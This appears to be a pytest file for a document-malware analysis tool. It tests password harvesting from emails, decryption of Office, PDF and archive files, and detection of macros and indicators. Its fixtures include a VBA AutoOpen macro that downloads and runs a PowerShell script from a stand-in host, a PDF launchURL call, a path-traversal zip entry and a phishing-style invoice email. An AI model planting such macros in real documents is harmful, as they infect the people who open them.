"""Encrypted documents/archives: password harvesting, unlocking, and the
analysis running on the decrypted copy."""

from __future__ import annotations

import io
import os
import sys
import zipfile
from email.message import EmailMessage
from pathlib import Path

import pytest

from docutracex import passwords, unlock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))

msoffcrypto = pytest.importorskip("msoffcrypto")

MACRO = 'Sub AutoOpen()\n  Shell "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://evil.example/p.ps1\')"\nEnd Sub\n'


def _docm() -> bytes:
    import officekit
    from ovba import Module

    # Padding keeps the encrypted package above the mini-stream cutoff
    # (msoffcrypto's writer and olefile disagree on tiny streams).
    return officekit.docm(["Invoice " + os.urandom(2500).hex()], [Module("NewMacros", MACRO)])


def _encrypt_ooxml(plain: bytes, password: str) -> bytes:
    from msoffcrypto.format.ooxml import OOXMLFile

    out = io.BytesIO()
    OOXMLFile(io.BytesIO(plain)).encrypt(password, out)
    return out.getvalue()


def _pdf(user: str, owner: str = "owner") -> bytes:
    from pypdf import PdfWriter

    w = PdfWriter()
    w.add_blank_page(100, 100)
    w.add_js("app.launchURL('http://evil.example/pdf');")
    w.encrypt(user_password=user, owner_password=owner, algorithm="AES-256")
    out = io.BytesIO()
    w.write(out)
    return out.getvalue()


def _zip_aes(entries: dict[str, bytes], password: str) -> bytes:
    pyzipper = pytest.importorskip("pyzipper")
    out = io.BytesIO()
    with pyzipper.AESZipFile(out, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
        z.setpassword(password.encode())
        for n, d in entries.items():
            z.writestr(n, d)
    return out.getvalue()


# --- password harvesting ----------------------------------------------------

@pytest.mark.parametrize("text,expected", [
    ("The password is: Inv2024", "Inv2024"),
    ("Password: 1234", "1234"),
    ("pwd=abc123", "abc123"),
    ("The password for the attached file is 4455.", "4455"),
    ("La contraseña es 8812", "8812"),
    ("Contraseña del archivo: Ab12cd", "Ab12cd"),
    ('La clave para abrir el documento es "Factura22".', "Factura22"),
    ("La password del file allegato è 7788", "7788"),
    ("Il codice di accesso è: X9Y8", "X9Y8"),
    ("Le mot de passe est : qwerty77", "qwerty77"),
    ("Das Kennwort lautet 9876", "9876"),
    ("Passwort für den Anhang: Rechnung#1", "Rechnung#1"),
    ("Het wachtwoord is 'Fact123'", "Fact123"),
    ("A senha do arquivo é 5566", "5566"),
    ("Hasło do pliku: 2024abc", "2024abc"),
    ("Şifre: 4321", "4321"),
    ("Пароль: 777888", "777888"),
    ("密码：abc123", "abc123"),
    ("Password:\n   Xy12zz", "Xy12zz"),
    ("<p>Password: <b>Qw12er</b></p>", "Qw12er"),
    ("PIN 4712", "4712"),
])
def test_harvest_languages(text: str, expected: str) -> None:
    assert expected in [c["password"] for c in passwords.harvest(text)]


@pytest.mark.parametrize("text", [
    "Please open the attachment. The file is password protected.",
    "Your password has expired. Click here to reset your password.",
    "Enter your email and password to continue.",
    "I pinned the doc to the channel.",
    "La contraseña se enviará por SMS.",
])
def test_harvest_ignores_prose(text: str) -> None:
    assert passwords.harvest(text) == []


def test_harvest_keeps_trailing_punctuation_variant() -> None:
    got = [c["password"] for c in passwords.harvest("Password: Inv2024!")]
    assert got[:2] == ["Inv2024", "Inv2024!"]


# --- unlocking --------------------------------------------------------------

def test_office_with_user_password_and_default(tmp_path: Path) -> None:
    plain = _docm()
    enc = tmp_path / "invoice.docm"
    enc.write_bytes(_encrypt_ooxml(plain, "S3cret!"))
    assert unlock.detect(enc)["encrypted"] is True

    rec = unlock.unlock_file(enc, tmp_path / "dec", unlock.candidates("wrong"))
    assert rec["decrypted"] is False and rec["findings"][0]["rule"] == "encrypted_document"

    rec = unlock.unlock_file(enc, tmp_path / "dec", unlock.candidates("S3cret!"))
    assert rec["decrypted"] and rec["password_source"] == "user"
    assert Path(rec["decrypted_file"]).read_bytes() == plain

    velvet = tmp_path / "book.xlsm"
    velvet.write_bytes(_encrypt_ooxml(plain, "VelvetSweatshop"))
    rec = unlock.unlock_file(velvet, tmp_path / "dec", unlock.candidates())
    assert rec["password_source"] == "default"
    assert rec["findings"][0]["rule"] == "encrypted_default_password"
    assert rec["findings"][0]["severity"] == "high"


def test_pdf_user_and_owner_only(tmp_path: Path) -> None:
    pdf = tmp_path / "doc.pdf"
    pdf.write_bytes(_pdf("pdfpw"))
    rec = unlock.unlock_file(pdf, tmp_path / "dec", unlock.candidates("pdfpw"))
    assert rec["decrypted"] and rec["password_source"] == "user"
    out = Path(rec["decrypted_file"])
    assert unlock.detect(out)["encrypted"] is False
    assert b"launchURL" in out.read_bytes()

    owner = tmp_path / "owner.pdf"
    owner.write_bytes(_pdf(""))
    rec = unlock.unlock_file(owner, tmp_path / "dec2", unlock.candidates())
    assert rec["password_source"] == "empty"
    assert rec["findings"][0]["rule"] == "encrypted_empty_password"


def test_zip_aes_and_7z(tmp_path: Path) -> None:
    z = tmp_path / "a.zip"
    z.write_bytes(_zip_aes({"../../evil/run.js": b"WScript.Echo(1)"}, "4455"))
    rec = unlock.extract_archive(z, tmp_path / "x", unlock.candidates(kind="archive"))
    assert rec["decrypted"] is False and rec["findings"][0]["rule"] == "encrypted_archive"
    assert not (tmp_path / "x").exists()

    rec = unlock.extract_archive(z, tmp_path / "x", unlock.candidates(
        harvested=[{"password": "4455", "context": "pw 4455"}], kind="archive"))
    assert rec["password_source"] == "email" and rec["findings"][0]["rule"] == "password_in_email"
    f = Path(rec["entries"][0]["file"])
    assert f.parent == tmp_path / "x" and f.name == "run.js"   # no path traversal

    py7zr = pytest.importorskip("py7zr")
    s = tmp_path / "b.7z"
    with py7zr.SevenZipFile(s, "w", password="infected", header_encryption=True) as a:
        a.writestr(b"payload", "dir/p.bin")
    rec = unlock.extract_archive(s, tmp_path / "y", unlock.candidates(kind="archive"))
    assert rec["decrypted"] and rec["password_source"] == "default"
    assert Path(rec["entries"][0]["file"]).read_bytes() == b"payload"


def test_archive_bounds(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    z = tmp_path / "bomb.zip"
    with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("big.bin", b"\0" * 200_000)
        zf.writestr("small.txt", b"hi")
    monkeypatch.setattr(unlock, "MAX_FILE", 100_000)
    rec = unlock.extract_archive(z, tmp_path / "out", [])
    by = {e["name"]: e for e in rec["entries"]}
    assert by["big.bin"].get("skipped") == "too large" and "file" not in by["big.bin"]
    assert Path(by["small.txt"]["file"]).read_bytes() == b"hi"


# --- whole analysis ---------------------------------------------------------

@pytest.fixture()
def cases_dir(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    from docutracex.config import settings

    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    return tmp_path / "cases"


def _new_case(cases_dir: Path, name: str, data: bytes, password: str | None = None):
    from docutracex import cases
    from docutracex.storage import CasePaths, write_json

    m = cases.create_case(io.BytesIO(data), name, cases_dir=cases_dir)
    paths = CasePaths(m["analysis_id"], cases_dir=cases_dir)
    if password:
        write_json(paths.password, {"password": password})
    return paths


def test_encrypted_docm_is_analysed_decrypted(cases_dir: Path) -> None:
    from docutracex import analyze
    from docutracex.storage import read_json

    paths = _new_case(cases_dir, "invoice.docm", _encrypt_ooxml(_docm(), "S3cret!"))
    res = analyze.analyze_case(paths.root)
    u = read_json(paths.subresult("unlock"))
    assert u["encrypted"] and not u["decrypted"]
    assert any(f["rule"] == "encrypted_document" for f in read_json(paths.subresult("findings"))["findings"])
    assert "ooxml" not in res["modules_run"]  # an OLE container, not a ZIP package

    from docutracex.storage import write_json
    write_json(paths.password, {"password": "S3cret!"})
    res = analyze.analyze_case(paths.root)
    u = read_json(paths.subresult("unlock"))
    assert u["decrypted"] and u["password_source"] == "user"
    assert "S3cret!" not in str(u)  # the analyst's password stays out of the results
    assert (paths.root / u["decrypted_path"]).is_file()
    assert "ooxml" in res["modules_run"] and "oletools" in res["modules_run"]
    ole = read_json(paths.subresult("oletools"))
    assert "AutoOpen" in (ole.get("code_text") or "")
    iocs = read_json(paths.subresult("iocs"))
    assert "evil.example" in str(iocs)
    # The stored original is untouched.
    assert unlock.detect(paths.root / read_json(paths.manifest)["original"]["stored_path"])["encrypted"]
    # A single-module re-run also works on the decrypted copy.
    analyze.run_module(paths.root, "oletools")
    assert "AutoOpen" in (read_json(paths.subresult("oletools")).get("code_text") or "")


def test_email_password_unlocks_zip_attachment(cases_dir: Path) -> None:
    from docutracex import analyze
    from docutracex.storage import read_json

    inner = _encrypt_ooxml(_docm(), "Fact2024")
    msg = EmailMessage()
    msg["From"] = "billing@example.com"
    msg["To"] = "victim@example.org"
    msg["Subject"] = "Factura pendiente"
    msg.set_content("Hola,\n\nAdjunto la factura. La contraseña del archivo es: Fact2024\n\nSaludos")
    msg.add_attachment(_zip_aes({"factura.docm": inner}, "Fact2024"), maintype="application",
                       subtype="zip", filename="factura.zip")
    paths = _new_case(cases_dir, "factura.eml", msg.as_bytes())
    analyze.analyze_case(paths.root)

    email = read_json(paths.subresult("email"))
    assert email["password_candidates"][0]["password"] == "Fact2024"
    assert any(f["rule"] == "password_in_body" for f in email["findings"])
    tree = read_json(paths.subresult("nested"))["tree"]
    arc = tree[0]
    assert arc["kind"] == "archive" and arc["archive"]["password_source"] == "email"
    doc = arc["children"][0]
    assert doc["filename"] == "factura.docm"
    assert doc["unlock"]["decrypted"] and doc["unlock"]["password_source"] == "email"
    rules = {f["rule"] for f in read_json(paths.subresult("findings"))["findings"]}
    assert "password_in_email" in rules


def test_archive_upload(cases_dir: Path) -> None:
    from docutracex import analyze
    from docutracex.storage import read_json

    data = _zip_aes({"inv.pdf": _pdf("")}, "infected")
    paths = _new_case(cases_dir, "drop.zip", data)
    res = analyze.analyze_case(paths.root)
    assert "archive" in res["modules_run"]
    arc = read_json(paths.subresult("archive"))
    assert arc["decrypted"] and arc["entries"][0]["stored_path"].startswith("extracted/archive/")
    node = read_json(paths.subresult("nested"))["tree"][0]
    assert node["kind"] == "pdf" and node["unlock"]["password_source"] == "empty"


def test_api_password_kept_out_of_manifest(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from fastapi.testclient import TestClient

    from docutracex.app import create_app
    from docutracex.config import settings
    from docutracex.storage import CasePaths, read_json

    monkeypatch.setattr(settings, "cases_dir", tmp_path)
    client = TestClient(create_app())
    r = client.post("/api/cases", files={"file": ("a.pdf", _pdf("pw1"), "application/pdf")},
                    data={"password": "pw1"})
    assert r.status_code == 201
    aid = r.json()["analysis_id"]
    assert "pw1" not in str(r.json())
    paths = CasePaths(aid)
    assert read_json(paths.password) == {"password": "pw1"}
    r = client.post(f"/api/cases/{aid}/password", json={"password": "other"})
    assert r.status_code == 200 and r.json()["password_set"] is True
    assert read_json(paths.password) == {"password": "other"}
    r = client.post(f"/api/cases/{aid}/password", json={"password": ""})
    assert r.json()["password_set"] is False and not paths.password.exists()
    assert client.post(f"/api/cases/{aid}/password", json={"password": 5}).status_code == 400
